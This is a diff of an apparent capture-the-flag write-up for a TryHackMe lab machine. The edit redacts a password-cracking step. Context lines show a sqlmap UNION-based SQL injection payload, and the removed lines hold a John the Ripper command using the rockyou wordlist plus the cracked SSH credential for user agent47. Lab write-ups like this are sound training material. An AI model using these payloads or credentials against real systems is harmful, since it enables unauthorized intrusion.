@@ -258,11 +258,8 @@ Service detection performed. Please report any incorrect results at https://nmap
     Title: Generic <span style="color:#66d9ef">UNION</span> query (<span style="color:#66d9ef">NULL</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> columns
     Payload: searchitem<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7171,0x654a55516342637965547842506b644e7a43565354614c63756f4368676e70434165736969574c4a,0x7162716a71)-- -
 </span></code></pre></div><hr>
-<p>Next up; lets play crack the hash. Using John, we can handle this via our cracking rig..</p>
-<pre><code># john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt agent47.hash --fork=4`
-l# john --show --format=raw-SHA256 agent47.hash
-videogamer124
-</code></pre><p>Success! We get a password. Using the login combination of <code>agent47:videogamer124</code> we can now SSH into the machine.</p>
+<p>Before moving on we must crack that hash to get our user password. I used John for this, although online tools exist to allow you to reverse this. Due to THM guide rules, I&rsquo;m not able to include this but, that said, aquiring it isn&rsquo;t all that difficult either once you have the hash.</p>
+<p>Success! We get a password. Using the login combination of <code>agent47:&lt;REDACTED&gt;</code> we can now SSH into the machine.</p>
 <p>Once on the box, we would traditionally enumerate but this is a guided experience so lets stick with the beaten path; running <code>ss</code> to get a list of listening ports on the box, we see one that stands out due to its number as well as the fact that it didn&rsquo;t appear on our nmap scan:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">agent47@gamezone:~$ ss -tulpn
 Netid State      Recv-Q Send-Q           Local Address:Port                  Peer Address:Port
